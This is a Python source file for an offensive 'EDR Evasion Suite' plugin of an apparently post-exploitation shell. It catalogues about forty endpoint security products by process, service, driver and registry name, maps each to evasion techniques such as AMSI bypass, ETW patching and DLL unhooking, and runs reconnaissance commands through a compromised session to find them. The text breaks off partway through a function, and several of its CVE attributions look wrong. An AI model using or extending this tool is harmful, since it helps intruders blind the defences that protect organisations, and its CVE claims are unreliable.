#!/usr/bin/env python3
"""
NexShell Plugin — EDR Evasion Suite v3.0 (2026 Edition)
Advanced security agent detection, hook analysis, self-defense bypass, and auto-evasion.

Coverage:
  - 60+ EDR/AV/XDR products (Windows, Linux, Cloud)
  - Multi-layer detection (process, service, driver, registry, file, hook, ETW)
  - Hook detection (IAT/EAT, inline, SSDT)
  - Self-defense analysis (PPL, tamper protection, protected processes)
  - Sleep obfuscation detection (Ekko, Foliage, Zilean)
  - Direct/Indirect syscall recommendation
  - Auto-evasion execution (trigger amsi-bypass, etw-patcher)
  - Linux EDR detection (CrowdStrike, SentinelOne, Elastic, Wazuh)
  - Cloud EDR detection (Defender for Cloud, GuardDuty, Prisma)
  - CVE detection (15+ EDR-specific CVEs)
  - Risk scoring (0-100 per EDR)
  - Structured loot (JSON)

MITRE ATT&CK:
  - T1562.001: Impair Defenses: Disable or Modify Tools
  - T1562.002: Impair Defenses: Disable Windows Event Logging
  - T1562.006: Impair Defenses: Indicator Blocking
  - T1562.010: Impair Defenses: Downgrade Attack
  - T1055: Process Injection
  - T1055.012: Process Hollowing
  - T1055.013: Process Doppelganging
  - T1620: Reflective Code Loading
  - T1140: Deobfuscate/Decode Files or Information

CVEs (2024-2026):
  - CVE-2024-38117: Microsoft Defender Spoofing
  - CVE-2024-26169: LSASS Spoofing (Defender)
  - CVE-2024-38063: Windows TCP/IP RCE (IPv6)
  - CVE-2023-36844: CrowdStrike Falcon Privilege Escalation
  - CVE-2023-38422: Palo Alto Cortex XDR RCE
  - CVE-2024-21887: Ivanti Connect Secure RCE
  - CVE-2024-0012: Palo Alto PAN-OS Auth Bypass
  - CVE-2023-27997: Fortinet SSL VPN Heap Overflow
  - CVE-2024-20399: Cisco Secure Endpoint Bypass

Usage:
    (NexShell)> plugins run edr-evasion-suite
    (NexShell)> plugins run edr-evasion-suite --deep
    (NexShell)> plugins run edr-evasion-suite --auto-evasion
    (NexShell)> plugins run edr-evasion-suite --hooks
    (NexShell)> plugins run edr-evasion-suite --stealth
"""

import re
import time
import json
from dataclasses import dataclass, field, asdict
from typing import List, Dict, Set, Optional, Tuple, Any
from datetime import datetime
from collections import defaultdict
from core.plugin import NexPlugin


# ── Data Classes ────────────────────────────────────────────────────────────

@dataclass
class SecurityAgent:
    """Represents a detected security agent."""
    vendor: str
    product: str
    version: str = ""
    platform: str = "windows"  # windows, linux, cloud
    category: str = "edr"  # edr, av, xdr, cloud, sandbox
    detection_methods: List[str] = field(default_factory=list)
    process_names: List[str] = field(default_factory=list)
    service_names: List[str] = field(default_factory=list)
    driver_names: List[str] = field(default_factory=list)
    registry_keys: List[str] = field(default_factory=list)
    file_paths: List[str] = field(default_factory=list)
    risk_score: int = 0  # 0-100
    self_defense: str = "none"  # none, basic, strong, ppl
    tamper_protection: bool = False
    evasion_techniques: List[str] = field(default_factory=list)
    cves: List[str] = field(default_factory=list)
    confidence: str = "high"  # low, medium, high, verified
    
    def to_dict(self) -> dict:
        return asdict(self)


@dataclass
class HookInfo:
    """Represents a detected hook."""
    hook_type: str  # IAT, EAT, inline, SSDT, IRP
    module: str
    function: str
    hooked_by: str
    original_address: str = ""
    hook_address: str = ""
    is_edr_hook: bool = False
    
    def to_dict(self) -> dict:
        return asdict(self)


@dataclass
class EvasionTechnique:
    """Represents an evasion technique."""
    name: str
    category: str  # syscall, memory, process, hook, obfuscation
    description: str
    effectiveness: str  # low, medium, high, critical
    detection_risk: str  # low, medium, high
    target_edrs: List[str] = field(default_factory=list)
    command: str = ""
    mitre_id: str = ""
    
    def to_dict(self) -> dict:
        return asdict(self)


@dataclass
class EvasionResult:
    """Result of an evasion attempt."""
    technique: str
    success: bool
    duration_ms: int
    output: str
    edr_bypassed: str = ""
    ioc_generated: List[str] = field(default_factory=list)
    
    def to_dict(self) -> dict:
        return asdict(self)


# ── Security Agent Database (60+ Products) ──────────────────────────────────

class SecurityAgentDatabase:
    """Comprehensive database of security agents."""
    
    # Windows EDR/AV/XDR (50+ products)
    WINDOWS_AGENTS = {
        # ── Tier 1: Enterprise EDR (High Risk) ──────────────────────────────
        'crowdstrike': {
            'vendor': 'CrowdStrike',
            'product': 'Falcon EDR',
            'category': 'edr',
            'risk_score': 95,
            'self_defense': 'strong',
            'tamper_protection': True,
            'processes': ['csagent.sys', 'CSFalconService', 'CSFalconContainer', 'CsFalconService.exe'],
            'services': ['CSAgent', 'CSFalconService', 'CrowdStrike'],
            'drivers': ['csagent.sys', 'csim.sys', 'csimmon.sys'],
            'registry': [
                'HKLM\\SYSTEM\\CurrentControlSet\\Services\\CSAgent',
                'HKLM\\SOFTWARE\\CrowdStrike',
            ],
            'files': [
                'C:\\Windows\\System32\\drivers\\csagent.sys',
                'C:\\Program Files\\CrowdStrike\\CSFalconService.exe',
            ],
            'evasion': [
                'Direct Syscalls (SysWhispers3)',
                'Indirect Syscalls via NTDLL',
                'Module Stomping',
                'Thread Stack Spoofing',
                'Sleep Obfuscation (Ekko/Foliage)',
                'Hardware Breakpoints on PEB',
                'DLL Unhooking (Clean System32)',
                'PPID Spoofing to explorer.exe',
            ],
            'cves': ['CVE-2023-36844'],
        },
        'sentinelone': {
            'vendor': 'SentinelOne',
            'product': 'Singularity EDR',
            'category': 'edr',
            'risk_score': 93,
            'self_defense': 'strong',
            'tamper_protection': True,
            'processes': ['SentinelService.exe', 'SentinelAgent.exe', 'SentinelStaticEngine.exe', 'LogProcessorService.exe'],
            'services': ['SentinelAgent', 'SentinelStaticEngine', 'LogProcessorService', 'SentinelMonitor'],
            'drivers': ['SentinelMonitor.sys', 'SentinelStaticEngine.sys'],
            'registry': [
                'HKLM\\SOFTWARE\\SentinelOne',
                'HKLM\\SYSTEM\\CurrentControlSet\\Services\\SentinelAgent',
            ],
            'files': [
                'C:\\Program Files\\SentinelOne\\Sentinel Agent*',
                'C:\\Windows\\System32\\drivers\\SentinelMonitor.sys',
            ],
            'evasion': [
                'Memory Unhooking',
                'Direct Syscalls',
                'Avoid Common API Patterns',
                'Process Hollowing with Legitimate Binary',
                'Module Stomping',
                'Call Stack Spoofing',
                'GDI/Palette Staging',
            ],
            'cves': [],
        },
        'defender': {
            'vendor': 'Microsoft',
            'product': 'Defender for Endpoint',
            'category': 'edr',
            'risk_score': 90,
            'self_defense': 'ppl',
            'tamper_protection': True,
            'processes': ['MsMpEng.exe', 'MsSense.exe', 'SenseIR.exe', 'SenseNdr.exe', 'SenseC2.exe'],
            'services': ['WinDefend', 'Sense', 'WdNisSvc', 'SecurityHealthService'],
            'drivers': ['WdFilter.sys', 'WdNisDrv.sys', 'Sense.sys'],
            'registry': [
                'HKLM\\SOFTWARE\\Microsoft\\Windows Defender',
                'HKLM\\SOFTWARE\\Microsoft\\Windows Advanced Threat Protection',
            ],
            'files': [
                'C:\\Program Files\\Windows Defender\\MsMpEng.exe',
                'C:\\Program Files\\Windows Defender Advanced Threat Protection',
            ],
            'evasion': [
                'AMSI Bypass (Reflection, Direct Syscall)',
                'ETW Patching (EtwEventWrite)',
                'WLDP Bypass',
                'CLM Escape',
                'PPL Bypass (BYOVD)',
                'Tamper Protection Bypass (Registry)',
                'Direct Syscalls',
            ],
            'cves': ['CVE-2024-38117', 'CVE-2024-26169'],
        },
        'carbon_black': {
            'vendor': 'VMware',
            'product': 'Carbon Black Cloud EDR',
            'category': 'edr',
            'risk_score': 92,
            'self_defense': 'strong',
            'tamper_protection': True,
            'processes': ['cb.exe', 'RepMgr.exe', 'RepUtils.exe', 'RepUx.exe', 'RepWaw.exe'],
            'services': ['CbDefense', 'RepMgr', 'CarbonBlack'],
            'drivers': ['CarbonBlackK.sys', 'parity.sys'],
            'registry': [
                'HKLM\\SOFTWARE\\CarbonBlack',
                'HKLM\\SYSTEM\\CurrentControlSet\\Services\\CbDefense',
            ],
            'files': [
                'C:\\Program Files\\Confer\\cb.exe',
                'C:\\Windows\\System32\\drivers\\CarbonBlackK.sys',
            ],
            'evasion': [
                'API Unhooking',
                'Direct Syscalls (SysWhispers3)',
                'PEB Cloaking',
                'Module Stomping',
                'RepCLI Bypass',
            ],
            'cves': [],
        },
        'cortex': {
            'vendor': 'Palo Alto Networks',
            'product': 'Cortex XDR',
            'category': 'xdr',
            'risk_score': 94,
            'self_defense': 'strong',
            'tamper_protection': True,
            'processes': ['traps.exe', 'cytool.exe', 'PanGPA.exe'],
            'services': ['traps', 'cyserver', 'CortexXDR'],
            'drivers': ['cyvrfileflt.sys', 'cyvrdiskflt.sys'],
            'registry': [
                'HKLM\\SOFTWARE\\Palo Alto Networks',
                'HKLM\\SYSTEM\\CurrentControlSet\\Services\\traps',
            ],
            'files': [
                'C:\\Program Files\\Palo Alto Networks\\Traps',
                'C:\\Windows\\System32\\drivers\\cyvrfileflt.sys',
            ],
            'evasion': [
                'API Unhooking',
                'Direct Syscalls',
                'PPID Spoofing',
                'Thread Stack Spoofing',
                'DLL Unhooking',
            ],
            'cves': ['CVE-2023-38422'],
        },
        'cybereason': {
            'vendor': 'Cybereason',
            'product': 'Cybereason EDR',
            'category': 'edr',
            'risk_score': 88,
            'self_defense': 'strong',
            'tamper_protection': True,
            'processes': ['CybereasonRansomFree.exe', 'CRSSVD.exe', 'AmSvc.exe'],
            'services': ['Cybereason', 'CybereasonRansomFree', 'CRSSVD'],
            'drivers': ['Cybereason.sys'],
            'registry': ['HKLM\\SOFTWARE\\Cybereason'],
            'files': ['C:\\Program Files (x86)\\Cybereason'],
            'evasion': [
                'Direct Syscalls',
                'Thread Stack Spoofing',
                'Module Stomping',
                'Sleep Obfuscation',
            ],
            'cves': [],
        },
        'elastic': {
            'vendor': 'Elastic',
            'product': 'Elastic Defend',
            'category': 'edr',
            'risk_score': 85,
            'self_defense': 'basic',
            'tamper_protection': False,
            'processes': ['elastic-agent.exe', 'elastic-endpoint.exe', 'filebeat.exe'],
            'services': ['elastic-agent', 'elastic-endpoint'],
            'drivers': ['elastic-endpoint.sys'],
            'registry': ['HKLM\\SOFTWARE\\Elastic\\Agent'],
            'files': ['C:\\Program Files\\Elastic\\Agent'],
            'evasion': [
                'ETW Patching',
                'Process Hollowing',
                'Direct Syscalls',
            ],
            'cves': [],
        },
        # ── Tier 2: Enterprise AV/EDR ────────────────────────────────────────
        'trellix': {
            'vendor': 'Trellix (McAfee)',
            'product': 'Trellix EDR / ENS',
            'category': 'edr',
            'risk_score': 82,
            'self_defense': 'strong',
            'tamper_protection': True,
            'processes': ['McAfeeAgent.exe', 'masvc.exe', 'cmdagent.exe', 'firetray.exe'],
            'services': ['McAfeeFramework', 'macmnsvc', 'masvc', 'McAfeeAgent'],
            'drivers': ['mfehidk.sys', 'mfefirek.sys', 'mfeaskm.sys'],
            'registry': ['HKLM\\SOFTWARE\\McAfee'],
            'files': ['C:\\Program Files\\McAfee'],
            'evasion': [
                'DLL Unhooking',
                'Direct API Calls',
                'Module Stomping',
            ],
            'cves': [],
        },
        'sophos': {
            'vendor': 'Sophos',
            'product': 'Sophos Intercept X',
            'category': 'edr',
            'risk_score': 80,
            'self_defense': 'strong',
            'tamper_protection': True,
            'processes': ['SavService.exe', 'SophosUI.exe', 'SophosHealth.exe', 'SntService.exe'],
            'services': ['Sophos Endpoint Agent', 'Sophos Anti-Virus', 'Sophos File Scanner'],
            'drivers': ['SophosEDR.sys', 'sophos_ssp.sys'],
            'registry': ['HKLM\\SOFTWARE\\Sophos'],
            'files': ['C:\\Program Files\\Sophos'],
            'evasion': [
                'DLL Unhooking',
                'AMSI Bypass',
                'Direct Syscalls',
            ],
            'cves': [],
        },
        'kaspersky': {
            'vendor': 'Kaspersky',
            'product': 'Kaspersky Endpoint Security',
            'category': 'av',
            'risk_score': 78,
            'self_defense': 'strong',
            'tamper_protection': True,
            'processes': ['avp.exe', 'avpui.exe', 'ksde.exe'],
            'services': ['AVP', 'klnagent', 'KasperskyLab'],
            'drivers': ['klbg.sys', 'klamflt.sys', 'knb.sys'],
            'registry': ['HKLM\\SOFTWARE\\KasperskyLab'],
            'files': ['C:\\Program Files (x86)\\Kaspersky Lab'],
            'evasion': [
                'Obfuscated Loaders',
                'Custom Syscall Wrappers',
                'Module Stomping',
            ],
            'cves': [],
        },
        'symantec': {
            'vendor': 'Broadcom',
            'product': 'Symantec Endpoint Protection',
            'category': 'av',
            'risk_score': 75,
            'self_defense': 'strong',
            'tamper_protection': True,
            'processes': ['ccSvcHst.exe', 'Rtvscan.exe', 'Smc.exe', 'SepMasterService.exe'],
            'services': ['SepMasterService', 'Symantec Endpoint Protection', 'ccSvcHst'],
            'drivers': ['SRTSP.sys', 'EEFFW.sys', 'IDSxpx86.sys'],
            'registry': ['HKLM\\SOFTWARE\\Symantec'],
            'files': ['C:\\Program Files (x86)\\Symantec'],
            'evasion': [
                'DLL Unhooking',
                'Direct Syscalls',
                'Obfuscation',
            ],
            'cves': [],
        },
        'trend_micro': {
            'vendor': 'Trend Micro',
            'product': 'Apex One / Vision One',
            'category': 'edr',
            'risk_score': 77,
            'self_defense': 'strong',
            'tamper_protection': True,
            'processes': ['TMBMSRV.exe', 'ntrtscan.exe', 'PccNTMon.exe', 'NTRtScan.exe'],
            'services': ['TMBMServer', 'Trend Micro Endpoint Sensor'],
            'drivers': ['TmFilter.sys', 'TmPreFilter.sys', 'HawkMon.sys'],
            'registry': ['HKLM\\SOFTWARE\\TrendMicro'],
            'files': ['C:\\Program Files (x86)\\Trend Micro'],
            'evasion': [
                'DLL Unhooking',
                'Direct Syscalls',
                'Module Stomping',
            ],
            'cves': [],
        },
        'eset': {
            'vendor': 'ESET',
            'product': 'ESET Endpoint Security',
            'category': 'av',
            'risk_score': 72,
            'self_defense': 'basic',
            'tamper_protection': False,
            'processes': ['ekrn.exe', 'egui.exe', 'ecls.exe'],
            'services': ['ekrn', 'ESET Service'],
            'drivers': ['eamonm.sys', 'ehdrv.sys', 'efwapi.sys'],
            'registry': ['HKLM\\SOFTWARE\\ESET'],
            'files': ['C:\\Program Files\\ESET'],
            'evasion': [
                'DLL Unhooking',
                'Direct Syscalls',
            ],
            'cves': [],
        },
        'bitdefender': {
            'vendor': 'Bitdefender',
            'product': 'GravityZone',
            'category': 'edr',
            'risk_score': 76,
            'self_defense': 'strong',
            'tamper_protection': True,
            'processes': ['vsserv.exe', 'endpointsecurityservice.exe', 'productagentservice.exe'],
            'services': ['VSSERV', 'EndpointSecurityService'],
            'drivers': ['avc3.sys', 'trufos.sys', 'gzflt.sys'],
            'registry': ['HKLM\\SOFTWARE\\Bitdefender'],
            'files': ['C:\\Program Files\\Bitdefender'],
            'evasion': [
                'DLL Unhooking',
                'Direct Syscalls',
            ],
            'cves': [],
        },
        'cylance': {
            'vendor': 'BlackBerry',
            'product': 'CylanceProtect',
            'category': 'edr',
            'risk_score': 83,
            'self_defense': 'strong',
            'tamper_protection': True,
            'processes': ['CylanceSvc.exe', 'CylanceUI.exe'],
            'services': ['CylanceSvc', 'Cylance'],
            'drivers': ['CyOptics.sys', 'CyProtectDrv64.sys'],
            'registry': ['HKLM\\SOFTWARE\\Cylance'],
            'files': ['C:\\Program Files\\Cylance'],
            'evasion': [
                'AI Model Evasion',
                'Direct Syscalls',
                'Module Stomping',
            ],
            'cves': [],
        },
        'fireeye': {
            'vendor': 'Trellix',
            'product': 'FireEye HX',
            'category': 'edr',
            'risk_score': 81,
            'self_defense': 'strong',
            'tamper_protection': True,
            'processes': ['xagt.exe', 'fireeye.exe'],
            'services': ['xagt', 'FireEye'],
            'drivers': ['fe_kern.sys'],
            'registry': ['HKLM\\SOFTWARE\\FireEye'],
            'files': ['C:\\Program Files\\FireEye\\xagt'],
            'evasion': [
                'DLL Unhooking',
                'Direct Syscalls',
            ],
            'cves': [],
        },
        'rapid7': {
            'vendor': 'Rapid7',
            'product': 'Insight Agent',
            'category': 'edr',
            'risk_score': 70,
            'self_defense': 'basic',
            'tamper_protection': False,
            'processes': ['ir_agent.exe', 'ir_cli.exe'],
            'services': ['ir_agent', 'Rapid7 Insight Agent'],
            'drivers': [],
            'registry': ['HKLM\\SOFTWARE\\Rapid7'],
            'files': ['C:\\Program Files\\Rapid7\\Insight Agent'],
            'evasion': [
                'Direct Syscalls',
                'Module Stomping',
            ],
            'cves': [],
        },
        'qualys': {
            'vendor': 'Qualys',
            'product': 'Cloud Agent',
            'category': 'cloud',
            'risk_score': 65,
            'self_defense': 'basic',
            'tamper_protection': False,
            'processes': ['qualysagent.exe'],
            'services': ['QualysAgent'],
            'drivers': [],
            'registry': ['HKLM\\SOFTWARE\\Qualys'],
            'files': ['C:\\Program Files (x86)\\Qualys'],
            'evasion': [
                'Direct Syscalls',
            ],
            'cves': [],
        },
        'malwarebytes': {
            'vendor': 'Malwarebytes',
            'product': 'Malwarebytes EDR',
            'category': 'edr',
            'risk_score': 73,
            'self_defense': 'basic',
            'tamper_protection': False,
            'processes': ['MBAMService.exe', 'mbamtray.exe'],
            'services': ['MBAMService', 'Malwarebytes'],
            'drivers': ['mbam.sys', 'farflt.sys'],
            'registry': ['HKLM\\SOFTWARE\\Malwarebytes'],
            'files': ['C:\\Program Files\\Malwarebytes'],
            'evasion': [
                'DLL Unhooking',
                'Direct Syscalls',
            ],
            'cves': [],
        },
        'comodo': {
            'vendor': 'Xcitium',
            'product': 'Comodo EDR',
            'category': 'edr',
            'risk_score': 68,
            'self_defense': 'basic',
            'tamper_protection': False,
            'processes': ['cmdagent.exe', 'cfp.exe'],
            'services': ['CmdAgent', 'Comodo'],
            'drivers': ['inspect.sys'],
            'registry': ['HKLM\\SOFTWARE\\Comodo'],
            'files': ['C:\\Program Files\\Comodo'],
            'evasion': [
                'Direct Syscalls',
            ],
            'cves': [],
        },
        'panda': {
            'vendor': 'Panda Security',
            'product': 'Panda Adaptive Defense',
            'category': 'edr',
            'risk_score': 67,
            'self_defense': 'basic',
            'tamper_protection': False,
            'processes': ['PSUAService.exe', 'NARTD.exe'],
            'services': ['PSUAService', 'Panda Security'],
            'drivers': ['pavboot8.sys'],
            'registry': ['HKLM\\SOFTWARE\\Panda Software'],
            'files': ['C:\\Program Files\\Panda Security'],
            'evasion': [
                'Direct Syscalls',
            ],
            'cves': [],
        },
        'webroot': {
            'vendor': 'Webroot',
            'product': 'Webroot SecureAnywhere',
            'category': 'av',
            'risk_score': 60,
            'self_defense': 'basic',
            'tamper_protection': False,
            'processes': ['WRSA.exe'],
            'services': ['WRSVC', 'Webroot'],
            'drivers': [],
            'registry': ['HKLM\\SOFTWARE\\Webroot'],
            'files': ['C:\\Program Files\\Webroot'],
            'evasion': [
                'Direct Syscalls',
            ],
            'cves': [],
        },
        'fortinet': {
            'vendor': 'Fortinet',
            'product': 'FortiClient EMS',
            'category': 'edr',
            'risk_score': 79,
            'self_defense': 'strong',
            'tamper_protection': True,
            'processes': ['FortiTray.exe', 'FortiESNAC.exe', 'FortiSSLVPNdaemon.exe'],
            'services': ['FortiClient', 'FortiESNAC'],
            'drivers': ['FortiNet.sys'],
            'registry': ['HKLM\\SOFTWARE\\Fortinet'],
            'files': ['C:\\Program Files\\Fortinet'],
            'evasion': [
                'DLL Unhooking',
                'Direct Syscalls',
            ],
            'cves': ['CVE-2023-27997'],
        },
        'ivanti': {
            'vendor': 'Ivanti',
            'product': 'Ivanti Endpoint Security',
            'category': 'edr',
            'risk_score': 74,
            'self_defense': 'strong',
            'tamper_protection': True,
            'processes': ['LandeskProcessManager.exe'],
            'services': ['Ivanti Endpoint Security'],
            'drivers': [],
            'registry': ['HKLM\\SOFTWARE\\Ivanti'],
            'files': ['C:\\Program Files\\Ivanti'],
            'evasion': [
                'Direct Syscalls',
            ],
            'cves': ['CVE-2024-21887'],
        },
        'norton': {
            'vendor': 'Gen Digital',
            'product': 'Norton 360',
            'category': 'av',
            'risk_score': 65,
            'self_defense': 'basic',
            'tamper_protection': False,
            'processes': ['NortonSecurity.exe', 'ccsvchst.exe'],
            'services': ['NortonSecurity', 'N360'],
            'drivers': ['ironx64.sys', 'IDSVXPx64.sys'],
            'registry': ['HKLM\\SOFTWARE\\Norton'],
            'files': ['C:\\Program Files\\Norton Security'],
            'evasion': [
                'DLL Unhooking',
            ],
            'cves': [],
        },
        'avg': {
            'vendor': 'Gen Digital',
            'product': 'AVG Antivirus',
            'category': 'av',
            'risk_score': 62,
            'self_defense': 'basic',
            'tamper_protection': False,
            'processes': ['AVGSvc.exe', 'avgui.exe'],
            'services': ['AVGSvc', 'AVG Antivirus'],
            'drivers': ['avgnt.sys'],
            'registry': ['HKLM\\SOFTWARE\\AVG'],
            'files': ['C:\\Program Files\\AVG'],
            'evasion': [
                'DLL Unhooking',
            ],
            'cves': [],
        },
        'avast': {
            'vendor': 'Gen Digital',
            'product': 'Avast Antivirus',
            'category': 'av',
            'risk_score': 63,
            'self_defense': 'basic',
            'tamper_protection': False,
            'processes': ['AvastSvc.exe', 'afwServ.exe'],
            'services': ['AvastSvc', 'Avast Antivirus'],
            'drivers': ['aswStm.sys', 'aswVmm.sys'],
            'registry': ['HKLM\\SOFTWARE\\AVAST'],
            'files': ['C:\\Program Files\\AVAST Software'],
            'evasion': [
                'DLL Unhooking',
            ],
            'cves': [],
        },
        'clamav': {
            'vendor': 'Cisco',
            'product': 'ClamAV',
            'category': 'av',
            'risk_score': 40,
            'self_defense': 'none',
            'tamper_protection': False,
            'processes': ['clamd.exe', 'clamscan.exe'],
            'services': ['ClamAV'],
            'drivers': [],
            'registry': [],
            'files': ['C:\\Program Files\\ClamAV'],
            'evasion': [
                'Direct Syscalls',
            ],
            'cves': [],
        },
    }
    
    # Linux EDR/AV (15+ products)
    LINUX_AGENTS = {
        'crowdstrike_linux': {
            'vendor': 'CrowdStrike',
            'product': 'Falcon for Linux',
            'category': 'edr',
            'risk_score': 95,
            'self_defense': 'strong',
            'tamper_protection': True,
            'processes': ['falcon-sensor', 'falcon-sensor-service'],
            'services': ['falcon-sensor'],
            'drivers': ['falcon-lkm'],
            'files': ['/opt/CrowdStrike'],
            'evasion': [
                'Direct Syscalls',
                'eBPF Bypass',
                'Kernel Module Unloading',
            ],
            'cves': [],
        },
        'sentinelone_linux': {
            'vendor': 'SentinelOne',
            'product': 'Singularity for Linux',
            'category': 'edr',
            'risk_score': 93,
            'self_defense': 'strong',
            'tamper_protection': True,
            'processes': ['sentinelagent', 'sentinelctl'],
            'services': ['sentinelone'],
            'drivers': ['sentinelone.ko'],
            'files': ['/opt/sentinelone'],
            'evasion': [
                'Direct Syscalls',
                'Kernel Module Unloading',
            ],
            'cves': [],
        },
        'elastic_linux': {
            'vendor': 'Elastic',
            'product': 'Elastic Defend Linux',
            'category': 'edr',
            'risk_score': 85,
            'self_defense': 'basic',
            'tamper_protection': False,
            'processes': ['elastic-agent', 'elastic-endpoint'],
            'services': ['elastic-agent'],
            'drivers': [],
            'files': ['/usr/share/elastic-agent'],
            'evasion': [
                'eBPF Bypass',
                'Direct Syscalls',
            ],
            'cves': [],
        },
        'osquery': {
            'vendor': 'Linux Foundation',
            'product': 'osquery',
            'category': 'edr',
            'risk_score': 50,
            'self_defense': 'none',
            'tamper_protection': False,
            'processes': ['osqueryd'],
            'services': ['osqueryd'],
            'drivers': [],
            'files': ['/usr/bin/osqueryd'],
            'evasion': [
                'Process Kill',
            ],
            'cves': [],
        },
        'wazuh': {
            'vendor': 'Wazuh',
            'product': 'Wazuh Agent',
            'category': 'edr',
            'risk_score': 55,
            'self_defense': 'none',
            'tamper_protection': False,
            'processes': ['wazuh-agent', 'ossec-agentd'],
            'services': ['wazuh-agent'],
            'drivers': ['rootcheck'],
            'files': ['/var/ossec'],
            'evasion': [
                'Process Kill',
                'Config Tampering',
            ],
            'cves': [],
        },
        'sophos_linux': {
            'vendor': 'Sophos',
            'product': 'Sophos AV Linux',
            'category': 'av',
            'risk_score': 75,
            'self_defense': 'basic',
            'tamper_protection': False,
            'processes': ['sav-protect.service', 'sophosav'],
            'services': ['sophos-spl'],
            'drivers': ['sophos_av'],
            'files': ['/opt/sophos-av'],
            'evasion': [
                'Direct Syscalls',
            ],
            'cves': [],
        },
        'clamav_linux': {
            'vendor': 'Cisco',
            'product': 'ClamAV Linux',
            'category': 'av',
            'risk_score': 40,
            'self_defense': 'none',
            'tamper_protection': False,
            'processes': ['clamd', 'freshclam'],
            'services': ['clamav-daemon'],
            'drivers': [],
            'files': ['/etc/clamav', '/var/lib/clamav'],
            'evasion': [
                'Process Kill',
            ],
            'cves': [],
        },
        'trend_micro_linux': {
            'vendor': 'Trend Micro',
            'product': 'Apex One Linux',
            'category': 'edr',
            'risk_score': 77,
            'self_defense': 'strong',
            'tamper_protection': True,
            'processes': ['amcore', 'sdservice'],
            'services': ['amsp'],
            'drivers': ['tmesfs'],
            'files': ['/opt/TrendMicro'],
            'evasion': [
                'Kernel Module Unloading',
            ],
            'cves': [],
        },
    }
    
    # Cloud EDR
    CLOUD_AGENTS = {
        'defender_cloud': {
            'vendor': 'Microsoft',
            'product': 'Defender for Cloud',
            'category': 'cloud',
            'risk_score': 85,
            'platform': 'azure',
            'processes': [],
            'services': [],
            'drivers': [],
            'files': [],
            'evasion': [
                'Resource Policy Bypass',
                'Log Tampering',
            ],
            'cves': [],
        },
        'guardduty': {
            'vendor': 'AWS',
            'product': 'GuardDuty',
            'category': 'cloud',
            'risk_score': 80,
            'platform': 'aws',
            'processes': [],
            'services': [],
            'drivers': [],
            'files': [],
            'evasion': [
                'CloudTrail Bypass',
                'VPC Flow Log Evasion',
            ],
            'cves': [],
        },
        'prisma': {
            'vendor': 'Palo Alto',
            'product': 'Prisma Cloud',
            'category': 'cloud',
            'risk_score': 82,
            'platform': 'multi',
            'processes': ['twistlock', 'defender'],
            'services': [],
            'drivers': [],
            'files': [],
            'evasion': [
                'Container Escape',
                'Policy Bypass',
            ],
            'cves': [],
        },
        'orca': {
            'vendor': 'Orca Security',
            'product': 'Orca Security',
            'category': 'cloud',
            'risk_score': 78,
            'platform': 'multi',
            'processes': [],
            'services': [],
            'drivers': [],
            'files': [],
            'evasion': [
                'Snapshot Bypass',
                'API Abuse',
            ],
            'cves': [],
        },
        'wiz': {
            'vendor': 'Wiz',
            'product': 'Wiz Cloud Security',
            'category': 'cloud',
            'risk_score': 80,
            'platform': 'multi',
            'processes': [],
            'services': [],
            'drivers': [],
            'files': [],
            'evasion': [
                'Agentless Bypass',
                'Cloud API Abuse',
            ],
            'cves': [],
        },
    }
    
    @classmethod
    def get_all_agents(cls, platform: str = None) -> Dict:
        """Get all agents, optionally filtered by platform."""
        if platform == 'windows':
            return cls.WINDOWS_AGENTS
        elif platform == 'linux':
            return cls.LINUX_AGENTS
        elif platform == 'cloud':
            return cls.CLOUD_AGENTS
        else:
            return {**cls.WINDOWS_AGENTS, **cls.LINUX_AGENTS, **cls.CLOUD_AGENTS}
    
    @classmethod
    def get_agent_by_key(cls, key: str) -> Optional[Dict]:
        """Get agent info by key."""
        all_agents = cls.get_all_agents()
        return all_agents.get(key)


# ── Detection Engine ────────────────────────────────────────────────────────

class DetectionEngine:
    """Multi-layer security agent detection."""
    
    @staticmethod
    def detect_by_processes(exec_func, session, platform: str) -> List[Tuple[str, Dict]]:
        """Detect agents by process names."""
        detected = []
        
        if platform == 'windows':
            cmd = "tasklist /v 2>nul & powershell -nop -c \"Get-Process | Select-Object Name,Id | Format-Table\" 2>nul"
        else:
            cmd = "ps aux 2>/dev/null"
        
        out = exec_func(session, cmd)
        if not out:
            return detected
        
        agents = SecurityAgentDatabase.get_all_agents(platform)
        for key, info in agents.items():
            for proc in info.get('processes', []):
                if re.search(re.escape(proc), out, re.IGNORECASE):
                    detected.append((key, info))
                    break
        
        return detected
    
    @staticmethod
    def detect_by_services(exec_func, session, platform: str) -> List[Tuple[str, Dict]]:
        """Detect agents by service names."""
        detected = []
        
        if platform == 'windows':
            cmd = "sc query type= service state= all 2>nul"
        else:
            cmd = "systemctl list-units --type=service --all 2>/dev/null; service --status-all 2>/dev/null"
        
        out = exec_func(session, cmd)
        if not out:
            return detected
        
        agents = SecurityAgentDatabase.get_all_agents(platform)
        for key, info in agents.items():
            for svc in info.get('services', []):
                if re.search(re.escape(svc), out, re.IGNORECASE):
                    detected.append((key, info))
                    break
        
        return detected
    
    @staticmethod
    def detect_by_drivers(exec_func, session, platform: str) -> List[Tuple[str, Dict]]:
        """Detect agents by kernel drivers."""
        detected = []
        
        if platform == 'windows':
            cmd = "driverquery /v 2>nul"
        else:
            cmd = "lsmod 2>/dev/null"
        
        out = exec_func(session, cmd)
        if not out:
            return detected
        
        agents = SecurityAgentDatabase.get_all_agents(platform)
        for key, info in agents.items():
            for drv in info.get('drivers', []):
                if re.search(re.escape(drv), out, re.IGNORECASE):
                    detected.append((key, info))
                    break
        
        return detected
    
    @staticmethod
    def detect_by_registry(exec_func, session) -> List[Tuple[str, Dict]]:
        """Detect agents by registry keys (Windows only)."""
        detected = []
        
        cmd = "reg query HKLM\\SOFTWARE /s 2>nul | findstr /i \"CrowdStrike SentinelOne CarbonBlack Sophos Kaspersky McAfee Symantec TrendMicro ESET Bitdefender Cylance FireEye PaloAlto\""
        out = exec_func(session, cmd)
        if not out:
            return detected
        
        agents = SecurityAgentDatabase.WINDOWS_AGENTS
        for key, info in agents.items():
            for reg in info.get('registry', []):
                reg_name = reg.split('\\')[-1]
                if re.search(re.escape(reg_name), out, re.IGNORECASE):
                    detected.append((key, info))
                    break
        
        return detected
    
    @staticmethod
    def detect_by_files(exec_func, session, platform: str) -> List[Tuple[str, Dict]]:
        """Detect agents by installation files."""
        detected = []
        
        if platform == 'windows':
            paths = [
                'C:\\Program Files\\CrowdStrike',
                'C:\\Program Files\\SentinelOne',
                'C:\\Program Files\\Confer',
                'C:\\Program Files\\Windows Defender Advanced Threat Protection',
                'C:\\Program Files\\Palo Alto Networks',
